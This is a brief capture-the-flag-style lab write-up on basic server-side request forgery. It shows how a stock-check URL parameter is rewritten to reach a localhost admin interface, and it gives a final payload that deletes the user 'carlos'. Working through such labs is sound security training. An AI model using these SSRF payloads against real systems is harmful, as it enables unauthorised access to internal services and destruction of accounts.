
# Lab: Basic SSRF against the local server

This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at ```http://localhost/admin``` and delete the user ```carlos```.

-------
Analysis:

localhost -> just change the value of the

```stockApi=http%3A%2F%2Fstock.localhost.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1```
<br>
to
<br>

```stockApi=http://localhost/```

after this we are sure that there is a SSRF vulnerability here  

via the GUI we can try to remove the user

delete carlos request - ```http://127.1/admin/delete?username=carlos```

final payload
```stockApi=http://127.1/admin/delete?username=carlos```

python3 lab_ssrf.py <www.example.com>
